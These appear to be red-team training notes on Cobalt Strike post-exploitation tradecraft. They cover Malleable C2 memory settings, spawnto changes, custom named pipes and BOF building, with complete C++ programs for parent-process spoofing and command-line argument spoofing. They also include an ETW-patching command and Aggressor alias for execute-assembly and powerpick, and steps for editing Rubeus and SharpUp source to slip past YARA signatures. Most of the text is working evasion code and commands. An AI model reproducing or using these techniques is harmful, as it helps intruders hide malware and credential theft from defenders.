Cobalt Strikes post-exploitation commands can be broken down into 4 broad categories:

- House-Keeping - These commands set a configuration option in Beacon, such as sleep and jobs or do something in the UI such as clear help & note. They don't task beacon to perform an executable action.
- API Only - these commands are built directly into the beacon payload using the windows APIs. Examples include cd, cp, ls, make_token, and ps.
- Inline Execution - These commands are implemented as BOFs which are pushed to beacon over the C2 channel and executed within the beacon process. `jump psexec/64/psh` and `remote-exec psexec/wmi` are amongst this group
- Fork and Run - these commands spawn a temporary process and a post exploitation DLL is injected into it. The capability runs and any output is captured over a named pipe. `execute-assembly` `powerpick` and `mimikatz` use this pattern

There are alos commands that spawn cmd.exe (`shell`) and powershell.exe (`jump winrm/64`, `remote-exec winrm`) by design, and commands that spawn arbitrary processes(`run`, `execute`)

For a full list of which command belongs to which category, see [this](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm)

## Memory Permissions & Cleanup

Many defensive products will alert on RWX memory regions within a native process as potentially malicious, so we want to avoid them where possible.

The reason we end up with two memory allocations is because Beacon is actually implemented as a DLL and a technique called reflective DLL injection is used to load it into memory.  Whenever we generate Beacon shellcode, what we are actually getting is the Beacon DLL, plus a reflective loader component.  Cobalt Strike's default reflective loader is based on Stephen Fewer's [ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection).

The job of the reflective loader is to map the Beacon DLL into memory in a similar way that the standard Windows loader would if an API such as LoadLibrary was called.  This involves allocating new memory, mapping the PE headers, sections, import table, and relocations.  Once the DLL is mapped, it's entry point is called which kicks off the actual Beacon payload.

So in this case - 1 RWX region is allocated by the injector and the other RWX region by the reflective loader.

You will see similar allocations if you generate a regular EXE payload in Cobalt Strike.  Each payload artifact does the same thing, which is to inject and run the reflective loader.  The only difference in this example is that the default EXE artifact allocates memory for the reflective loader as RW first, and then switches to RX.  The memory allocation made by the reflective loader is still RWX.

The two main questions here are:

1. Can we prevent the reflective loader using RWX memory for Beacon?
2. Can we remove the reflective loader from memory once Beacon is running?

The answers are of course "yes" and are exposed rather easily in Malleable C2.

```
stage {
set userwx "false";
set cleanup "true";
}
```

Setting `userwx` to `false` will tell the reflective loader to allocate memory for Beacon as RW first and then flips it to RX.  Setting `cleanup` to `true` instructions Beacon to attempt to unload the reflective loader from memory.

Close and relaunch the team server with the updated profile and regenerate your payloads.  Beacon will now be running in an RX memory region.

As with the default reflective loader, new memory allocations for BOFs are done so as RWX.  We can see this if we execute a BOF that will purposely block to give us time to inspect memory in Process Hacker.  Create a new directory and a file called `bof.c`, then add the following code:

```
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep(DWORD);

void go(char* args, int len) {

//just sleep to block execution
//so we can inspect memory
KERNEL32$Sleep(30000);
}
```

The Beacon header file can be pasted from the [cobalt-strike BOF repo](https://raw.githubusercontent.com/Cobalt-Strike/bof_template/main/beacon.h) or copied from one of the Arsenal Kits, such as `C:\Tools\cobaltstrike\arsenal-kit\kits\process_inject\src\beacon.h`.

BOFs can be built in Windows or Linux/WSL

On Windows opena  VS Developer Command Prompt and use cl.exe:
```
cl.exe /c /GS- bof.c /Fobof.o
```

In WSL use mingw:
```
x86_x64-w64-mingw32-gcc -c bof.c -o bof.o
```

in both cases `boif.o` is produced which can be executed in beacon using inline-execute

```
inline-execute C:\Users\Attacker\Desktop\test-bof\bof.o
```

During execution you will find a RWX region containing the BOF, furthermore once the BOF has completed an beacon starts checking back in, this RWX region will have been zeroed out but the region itself remains. This is beacuse beacon prefers to re-use memory for BOFs rather than re allocate and freeing memory each time. These behaviours can be overriden in malleable C2

```
process-inject {
set startrwx "false";
set userwx "false";
set bof_reuse_memory "false";
}
```

Setting startwx to false tells beacon to allocate BOF memory as RW rather than RWX. setting userwx to false tells beacon to set the memory to RX before execution. Setting bof_reuse_memory to false tells beacon to free BOF memory after execution. 

Because these directives are inside the process-inject block, they also have an impact on other injection commands such as `inject` `shinject` and `shspawn`

## Fork and Run memory allocations

The larger post-ex capabilities are implemented as Windows DLLs. To execute these they are paired with a reflective loader and injected into a process as shellcode. Fork and run commands have two variants which are described in Cobalt Strikes documentation as "process injection spawn" and "process injection explicit". The "spawn" method starts a temporary process and post-ex DLL is injected into it. Rather than spawning a new process, the "explicit" method injects the DLL into a process that is already running. 

The `process-inject` block covered in the previous section also controls the injection step of these fork and run commands. There are some additional settings that we can use in `post-ex` block to make these slightly more OPSEC safe:

```
post-ex {
set obfuscate "true";
set cleanup "true";
}
```

The obfuscate option is a combination of the obfuscate and userwx options from Beacon's stage block.  It will obfuscate the reflective DLL when loading it into memory and will do so using RW/RX memory permissions, rather then RWX.  The cleanup option will attempt to free the reflective loader from memory after it has loaded the post-ex DLL.  This option is particularly important when using the "explicit" fork and run pattern, otherwise you will leave instances of reflective loaders in memory of those processes.

*NOTE* the memory region is still unbacked and there is currently no option in Malleable C2 for executing fork and runs commands using module overloading. 

## SpawnTo

Cobalts `spawnto` value controls which binary is used as a temporary process for fork and run commands. If we execute `mimikatz` from a beacon and look at the running processes, we'll see that rundll32 gets spawned as a child of the current beacon process. This is Cobalts default spawnto and is almost universally flagged as malicious when spawned by a userland process. This is a behavioral detection.

You can change the spawnto binary for an individual beacon during runtime with the spawnto command. Let's have it spawnto notepad.exe:

```
spawnto x64 %windir%\sysnative\notepad.exe
```

This time, the Beacon will survive.

There is nothing special happening here - Beacon uses the CreateProcessA API to start whatever spawnto it's configured with.  If you want to set the default spawnto in your C2 profile, you can do so in the post-ex block.

```
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\notepad.exe";
    set spawnto_x64 "%windir%\\sysnative\\notepad.exe";
}
```

## Process Inject Kit

Process injection explicit is the second variant of Cobalts fork and run commands. Rather than spawning a new process, the "explicit" method injects the post-ex capability into one that is already running.

Beacon has two internal APIs that are responsible for these behaviors, called BeaconInjectTemporaryProcess and BeaconInjectProcess. They are defined in beacon.h as:
```
void BeaconInjectProcess(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len);
void BeaconInjectTemporaryProcess(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len);
```

In versions of Cobalt Strike prior to 4.5, the actual APIs used to control the "style" of process injection could only be controlled in the malleable C2 profile, and were somewhat limited in what you could choose from.  The Process Inject Kit was introduced as method of allowing operators to write their own custom implementations as a BOF.

It can be found under `C:\Tools\cobaltstrike\arsenal-kit\kits\process_inject`.  The `src` directory contains `process_inject_spawn.c` and `process_inject_explicit.c`, which controls each fork & run variant.  Modifying the kit is as simple as replacing this default code with your own injection methods, although it's still a good idea to use the internal Beacon APIs as a fallback in case your custom methods fail.

The kit can be built from WSL.
```
./build.sh /mnt/c/Tools/cobaltstrike/custom-injection
```

And add the Aggressor script loaded into the CS client.

## PPID Spoofing

When spawning a process it will do so as a child of the caller - this is why we saw rundll32 and notepad spawn as children of PowerShell in the previous module.  The "PPID spoofing" technique allows the caller to change the parent process for the spawned child.  For example, if our Beacon was running in powershell.exe, we can spawn processes as children of a completely different process, such as explorer.exe.

This helps to push back against detections that rely on these parent/child relationships, which is particularly useful if you have a Beacon running in an unusual process (e.g. from an initial compromise, lateral movement or some other exploit delivery), and process creation events would raise high severity alerts or be blocked outright.

The magic is achieved in the [STARTUPINFOEX](https://docs.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexw) struct, which has an `LPPROC_THREAD_ATTRIBUTE_LIST` member.  This allows us to pass additional attributes to the CreateProcess call.  The attributes themselves are listed [here](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute).  For the purpose of PPID spoofing, the one of interest is `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`

 *NOTE* The `lpValue` parameter is a pointer to **a handle to a process** to use instead of the calling process as the parent. The handle must have the `PROCESS_CREATE_PROCESS` access right.


### In code
To do this in code ourselves we need to declare a constant for the desired number of attributes - since we're only going to use the parent process attribute, this value will be 1. Also create the STARTUPINFOEX structure:

```
const DWORD attributeCount = 1;
LPSTARTUPINFOEXW si = new STARTUPINFOEXW();
si->StartupInfo.cb = sizeof(STARTUPINFOEXW);
```

The attribute list itself will be stored in a buffer that we need to allocate but we don't know how big it needs to be. It's required size will vary dependingo n the number of attributes. The InitializeProcThreadAttributeList API will provide the correct size if we pass NULL as the lpAttributeList parameter. 

```
SIZE_T lpSize = 0;

//call once to get lpSize
InitializeProcThreadAttributeList(
NULL,
attributeCount,
0,
&lpSize);
```

After this call, lpSize will hold a value which can be used to allocate the buffer. InitializeProcThreadAttributeList is then called again with a pointer to it.

```
//allocate the memory
si->lpAttributeList = (LPROC_THREAD_ATTRIBUTE_LIST)malloc(lpSize);

//call again to initialize the list
InitializeProcThreadAttributeList(
si->lpAttributeList,
attributeCount,
0
&lpSize);
```

The next step is to open a handle to the process intended to be the parent, and the call UpdateProcThreadAttribute to update the list. 

```
// open a handle to the desired parent
HANDLE hParent = OpenProcess(
PROCESS_CREATE_PROCESS,
FALSE,
5584); //hardcoded pid of explorer

//update the list
UpdateProcThreadAttribute(
si->lpAttributeList,
NULL,
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
&hParent,
sizeof(HANDLE),
NULL,
NULL);
```

CreateProcess can then be called, specifying the `EXTENDED_STARTUPINFO_PRESENT`flag. We'll also print the PID so we can check it in Process Hacker

```
//create process
PPROCESS_INFORMAITON pi = new PROCESS_INFORMATION();
wchar_t cmd[] = L"notepad.exe\0";

CreateProcess(
NULL,
cmd,
NULL,
NULL,
FALSE,
EXTENDED_STARTUPINFO_PRESENT,
NULL,
NULL,
&si->StartupInfo,
pi);

//print the pid
print("PID: %d\n", pi->dwProcessId)
```

We then need to do some cleanup after the process has been spawned. DeleteProcThreadAttributeList deletes the attribute list and then we free the memory we allocated with malloc. Also remember to close the handle to the parent process:

```
//cleaup list and memory
DeleteProcThreadAttributeList(si->lpAttributeList);
free(si->lpAttributeList);

//close handle to parent
CloseHandle(hParent);
```

Complete code:
```
#include <Windows.h>
#include <iostream>

int main()
{
    const DWORD attributeCount = 1;

    LPSTARTUPINFOEXW si = new STARTUPINFOEXW();
    si->StartupInfo.cb = sizeof(STARTUPINFOEXW);

    SIZE_T lpSize = 0;

    // call once to get lpSize
    InitializeProcThreadAttributeList(
        NULL,
        attributeCount,
        0,
        &lpSize);

    // allocate the memory
    si->lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(lpSize);

    // call again to initialise the list
    InitializeProcThreadAttributeList(
        si->lpAttributeList,
        attributeCount,
        0,
        &lpSize);

    // open a handle to the desired parent
    HANDLE hParent = OpenProcess(
        PROCESS_CREATE_PROCESS,
        FALSE,
        5584); // hardcoded pid of explorer

    // update the list
    UpdateProcThreadAttribute(
        si->lpAttributeList,
        NULL,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent,
        sizeof(HANDLE),
        NULL,
        NULL);

    // create process
    PPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    wchar_t cmd[] = L"notepad.exe\0";

    CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &si->StartupInfo, 
        pi);

    // print the pid
    printf("PID: %d\n", pi->dwProcessId);

    // cleanup list and memory
    DeleteProcThreadAttributeList(si->lpAttributeList);
    free(si->lpAttributeList);

    // close handle to parent
    CloseHandle(hParent);
}
```


### With Beacon
To set the parent PID for post-ex fork and run commands in beacon use the `ppid` command

Example of using both spawnto and ppid commands to spawn into and use MsEdge as the parent process:

```
spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
ppid 5056
mimikatz standard::coffee
```

## Command Line Argument Spoofing

Command line spoofing is a technique that can help obscure the actual arguments that a process executed.  This is achieved by spawning a process in a suspended state with a set of "fake" arguments that will be logged as part of the process creation event.  We then reach into the processes' memory and replace the fake arguments with the actual arguments we want to have run, and then resume the process.

As before, let's do this in code before looking at Cobalt Strike.

### Code
Create a powershell process and feed it some random oneliner.

```
LPSTARTUPINFOW si = new STARTUPINFOW();
si->cb = sizeof(STARTUPINFOW);

//the full process path
PPROCESS_INFORMATION pi = new PROCESS_INFORMATION();

LPCWSTR application = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\0";

//the "fake" arguments that we want logged
//get free disk space
wchar_t fakeArgs[] = L"powershell -c \"(Get-PSDrive $Env:SystemDrive.Trim(':')).Free/1GB\"\0";

CreateProcess(
application,
fakeArgs,
NULL,
NULL,
FALSE,
CREATE_SUSPENDED,
NULL,
NULL,
si,
pi);
```

To find the location of the CommandLine Buffer in memory, we first need to get a pointer to the PEB. This can be done using NtQueryInformationProcess to request the PROCESS_BASIC_INFORMATION data. 

```
//query process to obtain pointer to PEB
PPROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMAITON();

NtQueryInformationProcess(
pi->hProcess,
ProcessBasicInformation,
pbi,
sizeof(PROCESS_BASIC_INFORMATION),
NULL);
```

We then read the PEB

```
//read the PEB
PPEB peb = new PEB();
SIZE_T bytesRead = 0;

ReadProcessMemory(
pi->hProcess,
pbi->PebBaseAddress,
peb,
sizeof(PEB),
&bytesRead)
```

The PEB member that we're intereseted in is ProcessParameters which is a pointer to an RTL_USER_PROCESS_PARAMETERS structure.

```
//read process parameters
PRTL_USER_PROCESS_PARAMETERS parameters = new RTL_USER_PROCESS_PARAMETERS();

ReadProcessMemory(
pi->hProcess,
peb->ProcessParameters,
parameters,
sizeof(RTL_USER_PROCESS_PARAMETERS),
&bytesRead);
```

This structure contains the ImagePathName and CommandLine members, which are both [UNICODE_STRING](https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string) structures.  The size of the buffer is allocated based on the length of the fake arguments that the process was started with.  In this example, the length of the buffer is 132 bytes and the length of the string is 130 bytes.  This means that the real arguments must be shorter or of equal length to the fake arguments.

Before writing the new arguments, I'm going to completely zero out the content of the buffer

```
//create an empty vector of max buffer size
//and ensure its all xeroed
std::vector<BYTE> vector(szBuffer);
RtlZeroMemory(&vector[0], szBuffer);

//write that empty vector into the
//command line buffer
WriteProcessMemory(
pi->hProcess,
parameters->CommandLine.Buffer,
&vector[0],
szBuffer,
NULL);
```

Then write the real arguments into the buffer:

```
//write new args to execute
wchar_t realArgs[] = L"powershell -c \"Write-Host Hello World!\"0";
WriteProcessMemory(
pi->hProcess,
parameters->CommandLine.Buffer,
&realArgs,
sizeof(realArgs),
NULL);
```

The final step is then to just resume the process and close the handles

```
//resume process
ResumeThread(pi->hThread);

//close handles
Closehandle(pi->hThread);
CloseHandle(pi->hProcess);
```

if we run the application from a command prompt we'll see "Hello World" printed to the console, but the event log will show the fake arguments

Complete Code:

```
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

int main() {

    auto si = new STARTUPINFOW();
    si->cb = sizeof(STARTUPINFOW);

    auto pi = new PROCESS_INFORMATION();
    LPCWSTR application = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\0";

    // the "fake" arguments that we want logged
    wchar_t fakeArgs[] = L"powershell.exe -c \"(Get-PSDrive $Env:SystemDrive.Trim(':')).Free/1GB\"\0";

    // create process in suspended state
    CreateProcess(
        application,
        fakeArgs,
        nullptr,
        nullptr,
        FALSE,
        CREATE_SUSPENDED,
        nullptr,
        nullptr,
        si,
        pi);

    // get process basic information
    auto pbi = new PROCESS_BASIC_INFORMATION();
    NtQueryInformationProcess(
        pi->hProcess,
        ProcessBasicInformation,
        pbi,
        sizeof(PROCESS_BASIC_INFORMATION),
        nullptr);

    // read the PEB
    PPEB peb = new PEB();

    ReadProcessMemory(
        pi->hProcess,
        pbi->PebBaseAddress,
        peb,
        sizeof(PEB),
        nullptr);

    // read the process parameters
    auto parameters = new RTL_USER_PROCESS_PARAMETERS();

    ReadProcessMemory(
        pi->hProcess,
        peb->ProcessParameters,
        parameters,
        sizeof(RTL_USER_PROCESS_PARAMETERS),
        nullptr);

    auto szBuffer = parameters->CommandLine.Length;

    // allocate temp buffer
    auto tmpBuf = malloc(szBuffer);
    RtlZeroMemory(tmpBuf, szBuffer);

    // overwrite command line buffer
    WriteProcessMemory(
        pi->hProcess,
        parameters->CommandLine.Buffer,
        tmpBuf,
        szBuffer,
        nullptr);

    // free tmp buffer
    free(tmpBuf);

    // write real arguments into buffer
    wchar_t realArgs[] = L"powershell -c \"Write-Host Hello World\"";

    WriteProcessMemory(
        pi->hProcess,
        parameters->CommandLine.Buffer,
        &realArgs,
        sizeof(realArgs),
        nullptr);

    // resume the process
    ResumeThread(pi->hThread);

    // close the handles
    CloseHandle(pi->hThread);
    CloseHandle(pi->hProcess);
}
```

### Beacon

Command line argument spoofing is controlled in Beacon via the `argue` command

Here's a funny example using cat facts

```
argue powershell -c "Invoke-WebRequest -Uri 'https://catfact.ninja/fact' -UseBasicParsing | Select-Object -ExpandProperty 'Content' | ConvertFrom-Json | Select-Object -ExpandProperty fact"
```

Now when any powershell command is used in beacon, these are the fake arguments that the process will be created with

This is also compatible with other commands, such as run, which means it can be used whilst running any arbitrary binary on disk.  A simple example would be to change the arguments of PING.EXE to make it look like we're testing a connection to google.com, rather than an internal IP

```
argue ping -n 5 google.com
run ping -n 5 127.0.0.1
```

## SMB Named Pipes Names

Beacon uses SMB named pipes in four main ways

- Retrieve output from fork and run commands such as `execute-assembly` and `powerpick`
- connect to beacons ssh agent (not something we use in the course)
- the smb beacons named pipe stager (also not often used)
- C2 comms in the SMB Beacon itself

Sysmon event ID 17 (pipe created) and 18 (pipe connected) can be used to spot the default pipe name used by beacon in these situations. 

The default pipe name for post-ex commands is postex_#### the default for the SSh agent is postex_ssh_#### the default for the SMB beacons stager is status_## and the default for the main SMB Beacon C2 is msagent_## in each case the #'s are replaced with random hex values.

Many sysmon configs only log specific known pipe names, such as the defaults used in various toolsets. Therefore, changing the pipe names to something relatively random will get you by most times. Some operators choose to use names that are used by legitimate applications - a good example is the "mojo" pipe name that google chrome uses. If you do this, make sure your ppid and spawnto match this pretext.

The pipname_stager and ssh_pipename malleable C2 directives are global options. To change the pipe name used in post-ex commands, use the set pipename directive in the post-ex block:

```
post-ex {
        set pipename "totally_not_beacon, legitPipe_##";
}
```

## Event Tracing for Windows

ETW provides a mechanism for tracing and logging events that are raised by user-mode applications.  [SilkETW](https://github.com/mandiant/SilkETW) takes most of the pain out of consuming ETW events for a wide array of offensive and defensive purposes.  Its largest strengths (in my view) are the formats it can output to (URL, Windows Event Log, JSON) and its integration with [YARA](https://virustotal.github.io/yara/).

A popular use case for it is to provide .NET introspection - that is, to detect .NET assemblies in memory.  Let's see how it can detect Rubeus.  SilkETW is pre-installed on the Attacker Desktop but needs to be turned on (it's turned off by default to avoid filling the disk with logs).  Run `sc start SilkService`. then execute Rubeus.

When a .NET assembly is loaded, the `Microsoft-Windows-DotNETRuntime` provider produces an event called `AssemblyLoad`.  The data contained is the fully qualified name of the assembly.  SilkETW logs can be found under _Applications & Services Logs > SilkService-Log_ but it's easier to search using PowerShell due to the volume of events.

```
$event = Get-EventLog -LogName SilkService-Log -Message *Rubeus* | select -Last 1 -ExpandProperty Message | ConvertFrom-Json
$event.XmlEventData
```

One method to bypass ETW is to patch the `EtwEventWrite` exported function inside ntdll.dll.  This research was published by Adam Chester [here](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and works just like various AMSI bypasses (by patching functions in memory).  So how do we integrate this into Beacon's `execute-assembly` command?  Since CS 4.8 a new "patch" ability was added for this purpose, which instructs Beacon to perform the given memory patches in the temporary process prior to the post-ex capability being executed.  The two commands this is supported on is `execute-assembly` and `powerpick`

```
execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
```

This time, no logs for Rubeus will be generated.

Obviously having to type or copy/paste the patches every time is a little inconvenient, so we could create custom commands in Aggressor instead.  The two relevant Aggressor functions are [bexecute_assembly](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#bexecute_assembly) and [bpowerpick](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#bpowerpick).  We can mostly just pass through args 1-3 from the user, but hardcode the patches into $4

```
alias powerpick-patched {
   bpowerpick($1, $2, $3, "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00");
}
```

## Inline (.NET) Execution

[@anthemtotheego](https://twitter.com/anthemtotheego) wrote and published a BOF called [InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly) that allows .NET assemblies to be loaded and executed from inside Beacon, without needing fork and run.  Load the CNA located in `C:\Tools\InlineExecute-Assembly` and the `inlineExecute-Assembly` command will become available.

```
help inlineExecute-Assembly
inlineExecute-Assembly --dotnetassembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe --assemblyargs klist --amsi --etw
```

This will load the CLR into the current process, which may be detected as a suspicious image load event depending on the process your Beacon is running in.  You may also change the names of the AppDomain and named pipe from their default values of "totesLegit" using the `--appdomain` and `--pipe` options

```
inlineExecute-Assembly --dotnetassembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe --assemblyargs klist --amsi --etw --appdomain SharedDomain --pipe dotnet-diagnostic-1337
```

## Tool Signatures

You will come across instances where in-memory scanners are able to pick out known tools based on static signatures, even if other parts of your execution chain (ppid, spawnto, etc) are "correct".  For example, executing SharpUp will trigger the `Windows.Hacktool.SharpUp` alert

We can reference public YARA rules to get an idea about what these signatures are.  Some of the GhostPack projects provide a YARA rule file, such as [this one](https://github.com/GhostPack/Rubeus/blob/master/Rubeus.yar) for Rubeus.  The [Windows_Hacktool_SharpUp.yar](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Hacktool_SharpUp.yar) file is what we want to look at in this example

All of these are string-based, which makes them very easy to change in the project source code.  One tip is to check the `condition` for the rule to return a positive result because we may not need to change every single indicator.

In this case, it needs to either just find the `$guid`; or if the `$guid` is not found, then it needs `$str0`, `$str1`, and `$str2`; as well as `$print_str1`, `$print_str2`, or `$print_str3`.  Therefore, the absolute minimum number of changes required to prevent the rule from flagging is to remove the `$guid` and just one of the `$str` variables.

The GUID can be found in `AssemblyInfo.cs`

```
//the following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: GUID("fdd654f5-5c54-4d93-bf8e-faf11b00e3e9")]
```

This can be replaced with another randomly generated GUID - very easy to do in PowerShell:

```
[Guid]::NewGuid()
```

`$str0` and `$str1` are regular expressions used to filter services with binary paths ending with those file extensions

You can mix them up by changing the order, such as `\.dll|\.sys|\.exe`. and `\.bat|\.vbs|\.exe|\.ps1` respectively.

`$str2` is a WMI query, used a few times within different parts of the code.

The YARA signature for this one contains the literal string "{0}", which is used as part of `String.Format`.  At runtime, this string is replaced with the value of `sc.ServiceName`.  We can remove this signature by replacing this with string interpolation so that the entire line becomes

```
ManagementObjectSearcher wmiData = new ManagementObjectSearcher(@"root\cimv2", $"SELECT * FROM win32_service WHERE Name LIKE '{sc.ServiceName}'");
```

There are some quick ways to replace all instances of particular strings in Visual Studio which is helpful if they appear multiple times. Open the "Replace in Files" window by going to _Edit > Find and Replace > Replace in Files_ or pressing _Ctrl+Shift+H_.

Enter the original string and the replacement string, then click Replace All.  You may also switch to the "Find in Files" tab to search for all instances of a string (without replacing them)

Once the modifications are complete, rebuild the project and execute it on a protected endpoint.


